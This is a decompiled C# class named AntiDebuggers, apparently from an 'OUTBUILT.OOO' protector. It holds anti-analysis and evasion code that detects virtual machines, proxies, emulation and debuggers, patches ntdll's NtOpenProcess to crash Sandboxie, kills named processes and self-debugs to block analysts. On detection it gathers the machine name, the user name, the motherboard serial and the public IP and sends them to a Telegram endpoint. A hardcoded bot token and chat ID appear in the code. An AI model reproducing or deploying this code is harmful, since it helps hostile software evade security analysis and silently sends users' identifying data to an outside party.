using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using Microsoft.Win32;

namespace ns2;

internal sealed class AntiDebuggers
{
	private enum DebugEventType
	{
		CREATE_PROCESS_DEBUG_EVENT = 3,
		CREATE_THREAD_DEBUG_EVENT = 2,
		EXCEPTION_DEBUG_EVENT = 1,
		EXIT_PROCESS_DEBUG_EVENT = 5,
		EXIT_THREAD_DEBUG_EVENT = 4,
		LOAD_DLL_DEBUG_EVENT = 6,
		OUTPUT_DEBUG_STRING_EVENT = 8,
		RIP_EVENT = 9,
		UNLOAD_DLL_DEBUG_EVENT = 7
	}

	private struct DEBUG_EVENT
	{
		[MarshalAs(UnmanagedType.I4)]
		public DebugEventType dwDebugEventCode;

		public int dwProcessId;

		public int dwThreadId;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 1024)]
		public byte[] bytes;
	}

	private const string BotToken = "6288448141:AAGQvWNXoiH4xWfVgvDlQd4bNDT24sO8EM0";

	private const string ChatId = "5451659697";

	private const int DBG_CONTINUE = 65538;

	private const int DBG_EXCEPTION_NOT_HANDLED = -2147418111;

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern IntPtr GetModuleHandle(string lib);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern IntPtr GetProcAddress(IntPtr ModuleHandle, string Function);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool WriteProcessMemory(IntPtr ProcHandle, IntPtr BaseAddress, byte[] Buffer, uint size, int NumOfBytes);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool IsProcessCritical(IntPtr Handle, ref bool BoolToCheck);

	public static string ObtenerMotherBoardID()
	{
		string text = "MBID";
		try
		{
			ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_BaseBoard");
			ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get();
			foreach (ManagementObject item in managementObjectCollection)
			{
				text = (string)item["SerialNumber"];
			}
		}
		catch (Exception arg)
		{
			Console.WriteLine("ERROR: ", arg);
			text = "2";
		}
		return text.Trim();
	}

	private static string GetToolip()
	{
		try
		{
			string requestUriString = "https://api.ipify.org/";
			HttpWebRequest httpWebRequest = WebRequest.CreateHttp(requestUriString);
			httpWebRequest.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;
			httpWebRequest.Timeout = -1;
			using HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
			using StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream());
			return streamReader.ReadToEnd();
		}
		catch
		{
			return "ERROR";
		}
	}

	public static void SendMessage(string message)
	{
		try
		{
			string address = "https://api.telegram.org/" + message;
			using WebClient webClient = new WebClient();
			webClient.Encoding = Encoding.UTF8;
			string text = webClient.DownloadString(address);
		}
		catch (Exception)
		{
		}
	}

	internal void CheckForDebuggers()
	{
		string[] array = new string[0]
		{

		};
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				if (process == Process.GetCurrentProcess())
				{
					continue;
				}
				string[] array2 = array;
				foreach (string text in array2)
				{
					for (int k = 0; k < text.Length; k++)
					{
						int id = Process.GetCurrentProcess().Id;
						if (process.ProcessName.ToLower().Contains(array[k]))
						{
							Closes(array[k]);
							Closes(process.MainWindowTitle);
						}
						if (process.MainWindowTitle.ToLower().Contains(array[k]))
						{
							Closes(array[k]);
							Closes(process.ProcessName);
						}
					}
				}
			}
			Thread.Sleep(1000);
		}
	}

	private void Closes(string ProcessName)
	{
		try
		{
			Process[] processes = Process.GetProcesses();
			Process[] array = processes;
			foreach (Process process in array)
			{
				if (process.ProcessName.ToLower().Contains(ProcessName))
				{
					Process.Start(new ProcessStartInfo("cmd.exe", "/c START CMD /C \"COLOR C && TITLE OUTBUILT.OOO Protection && ECHO [OUTBUILT.OOO | Protector] Please contact support, you have been banned for running a debugger! && TIMEOUT 10\"")
					{
						CreateNoWindow = true,
						UseShellExecute = false
					});
					process.Kill();
					Environment.Exit(1);
				}
			}
		}
		catch
		{
		}
	}

	public void Start()
	{
		DBG();
		DetectVM();
		CheckForAnyProxyConnections();
		DetectEmulation();
		CrashingSandboxie();
		int id = Process.GetCurrentProcess().Id;
		DebugSelf(id);
	}

	private static void DBG()
	{
		if (Directory.Exists("C:/ProgramData/Outbuilt"))
		{
			Process.Start(new ProcessStartInfo("cmd.exe", "/c START CMD /C \"COLOR C && TITLE OUTBUILT.OOO Protection && ECHO [OUTBUILT.OOO | Protector] Please contact support, you have been banned for running a debugger! && TIMEOUT 10\"")
			{
				CreateNoWindow = true,
				UseShellExecute = false
			});
			Process.GetCurrentProcess().Kill();
		}
	}

	private static void DetectVM()
	{
		using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
		{
			using ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get();
			foreach (ManagementBaseObject item in managementObjectCollection)
			{
				if ((!(item["Manufacturer"].ToString().ToLower() == "microsoft corporation") || !item["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) && !item["Manufacturer"].ToString().ToLower().Contains("vmware") && !(item["Model"].ToString() == "VirtualBox"))
				{
					continue;
				}
				Directory.CreateDirectory("C:/ProgramData/Outbuilt");
				File.Create("C:/ProgramData/Outbuilt/VM Detected");
				string message = "Se ha detectado VM en " + Environment.MachineName + "\n\nCon El IP: " + GetToolip() + "\n\n" + ObtenerMotherBoardID() + "\n\nUser PC: " + Environment.UserName;
				SendMessage(message);
				Process[] processesByName = Process.GetProcessesByName("ira1n");
				if (processesByName.Length >= 1)
				{
					Process[] array = processesByName;
					foreach (Process process in array)
					{
						process.Kill();
					}
				}
				Environment.Exit(1);
			}
		}
		foreach (ManagementBaseObject item2 in new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController").Get())
		{
			if (!item2.GetPropertyValue("Name").ToString().Contains("VMware") || !item2.GetPropertyValue("Name").ToString().Contains("VBox"))
			{
				continue;
			}
			Directory.CreateDirectory("C:/ProgramData/Outbuilt");
			File.Create("C:/ProgramData/Outbuilt/VM Detected");
			string message2 = "Se ha detectado VM en " + Environment.MachineName + "\n\nCon El IP: " + GetToolip() + "\n\n" + ObtenerMotherBoardID() + "\n\nUser PC: " + Environment.UserName;
			SendMessage(message2);
			Process[] processesByName2 = Process.GetProcessesByName("KMPRO RAM");
			if (processesByName2.Length >= 1)
			{
				Process[] array2 = processesByName2;
				foreach (Process process2 in array2)
				{
					process2.Kill();
				}
			}
			Environment.Exit(1);
		}
	}

	private static void CheckForAnyProxyConnections()
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", writable: true);
		string text = registryKey.GetValue("ProxyEnable").ToString();
		object value = registryKey.GetValue("ProxyServer");
		if (!(text == "1"))
		{
			return;
		}
		Directory.CreateDirectory("C:\\ProgramData\\Outbuilt");
		File.Create("C:\\ProgramData\\Outbuilt\\DisableProxy.txt");
		string message = "Se ha detectado Uso De Proxy en " + Environment.MachineName + "\n\nCon El IP: " + GetToolip() + "\n\n" + ObtenerMotherBoardID() + "\n\nUser PC: " + Environment.UserName;
		SendMessage(message);
		Process[] processesByName = Process.GetProcessesByName("ira1n");
		if (processesByName.Length >= 1)
		{
			Process[] array = processesByName;
			foreach (Process process in array)
			{
				process.Kill();
			}
		}
		Environment.Exit(1);
	}

	private static void DetectEmulation()
	{
		long num = Environment.TickCount;
		Thread.Sleep(500);
		long num2 = Environment.TickCount;
		if (num2 - num >= 500)
		{
			return;
		}
		Directory.CreateDirectory("C:/ProgramData/Outbuilt");
		File.Create("C:/ProgramData/Outbuilt/Emulation");
		string message = "Se ha detectado Uso De Emulacion en " + Environment.MachineName + "\n\nCon El IP: " + GetToolip() + "\n\n" + ObtenerMotherBoardID() + "\n\nUser PC: " + Environment.UserName;
		SendMessage(message);
		Process[] processesByName = Process.GetProcessesByName("ira1n");
		if (processesByName.Length >= 1)
		{
			Process[] array = processesByName;
			foreach (Process process in array)
			{
				process.Kill();
			}
		}
		Environment.Exit(1);
	}

	public static void CrashingSandboxie()
	{
		if (Environment.Is64BitProcess)
		{
			return;
		}
		byte[] buffer = new byte[5] { 184, 38, 0, 0, 0 };
		IntPtr moduleHandle = GetModuleHandle("ntdll.dll");
		IntPtr procAddress = GetProcAddress(moduleHandle, "NtOpenProcess");
		WriteProcessMemory(Process.GetCurrentProcess().Handle, procAddress, buffer, 5u, 0);
		try
		{
			Process[] processes = Process.GetProcesses();
			Process[] array = processes;
			foreach (Process process in array)
			{
				bool BoolToCheck = false;
				try
				{
					IsProcessCritical(process.Handle, ref BoolToCheck);
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
	}

	private static void DebuggerThread(object arg)
	{
		DEBUG_EVENT lpDebugEvent = default(DEBUG_EVENT);
		lpDebugEvent.bytes = new byte[1024];
		if (!DebugActiveProcess((int)arg))
		{
			throw new Win32Exception();
		}
		while (WaitForDebugEvent(out lpDebugEvent, -1))
		{
			int dwContinueStatus = 65538;
			if (lpDebugEvent.dwDebugEventCode == DebugEventType.EXCEPTION_DEBUG_EVENT)
			{
				dwContinueStatus = -2147418111;
			}
			ContinueDebugEvent(lpDebugEvent.dwProcessId, lpDebugEvent.dwThreadId, dwContinueStatus);
		}
		throw new Win32Exception();
	}

	public static void DebugSelf(int ppid)
	{
		Console.WriteLine("Debugging {0}", ppid);
		Process currentProcess = Process.GetCurrentProcess();
		if (ppid != 0)
		{
			Console.WriteLine("Child Process");
			Process processById = Process.GetProcessById(ppid);
			Thread thread = new Thread(KillOnExit);
			thread.IsBackground = true;
			thread.Name = "KillOnExit";
			thread.Start(processById);
			WaitForDebugger();
			DebuggerThread(ppid);
			Environment.Exit(1);
			return;
		}
		Console.WriteLine("Parent Process");
		ProcessStartInfo startInfo = new ProcessStartInfo(Environment.GetCommandLineArgs()[0], currentProcess.Id.ToString())
		{
			UseShellExecute = false,
			CreateNoWindow = false,
			ErrorDialog = false
		};
		Process process = Process.Start(startInfo);
		if (process == null)
		{
			throw new ApplicationException("Unable to debug");
		}
		Thread thread2 = new Thread(KillOnExit);
		thread2.IsBackground = true;
		thread2.Name = "KillOnExit";
		thread2.Start(process);
		Thread thread3 = new Thread(DebuggerThread);
		thread3.IsBackground = true;
		thread3.Name = "DebuggerThread";
		thread3.Start(process.Id);
		WaitForDebugger();
	}

	private static void WaitForDebugger()
	{
		DateTime now = DateTime.Now;
		while (!IsDebuggerPresent())
		{
			if ((DateTime.Now - now).TotalMinutes > 1.0)
			{
				throw new TimeoutException("Debug operation timeout.");
			}
			Thread.Sleep(1);
		}
	}

	private static void KillOnExit(object process)
	{
		((Process)process).WaitForExit();
		Environment.Exit(1);
	}

	[DllImport("Kernel32.dll", SetLastError = true)]
	private static extern bool DebugActiveProcess(int dwProcessId);

	[DllImport("Kernel32.dll", SetLastError = true)]
	private static extern bool WaitForDebugEvent(out DEBUG_EVENT lpDebugEvent, int dwMilliseconds);

	[DllImport("Kernel32.dll", SetLastError = true)]
	private static extern bool ContinueDebugEvent(int dwProcessId, int dwThreadId, int dwContinueStatus);

	[DllImport("Kernel32.dll", SetLastError = true)]
	public static extern bool IsDebuggerPresent();
}
